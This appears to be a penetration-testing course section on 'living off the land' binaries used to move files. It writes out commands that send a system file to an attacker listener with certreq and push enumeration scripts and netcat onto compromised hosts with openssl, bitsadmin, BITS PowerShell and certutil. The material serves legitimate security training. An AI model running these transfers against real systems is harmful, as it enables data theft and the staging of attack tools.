The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

### LOLBAS
To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`
![LOLBAS project page listing binaries like CertReq.exe with functions and ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.
```bash
# This will send the file to our Netcat session, and we can copy-paste its contents.
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
>If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### GTFOBins

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

![GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.
```bash
# our Pwnbox
## Create Certificate in our Pwnbox
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out  certificate.pem
## Stand up the Server in our Pwnbox
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Download File from the Compromised Machine
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Other Common Living off the Land tools
#### Bitsadmin Download function
The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
```bash
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
```bash
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
#### Certutil
can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique,
```bash
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
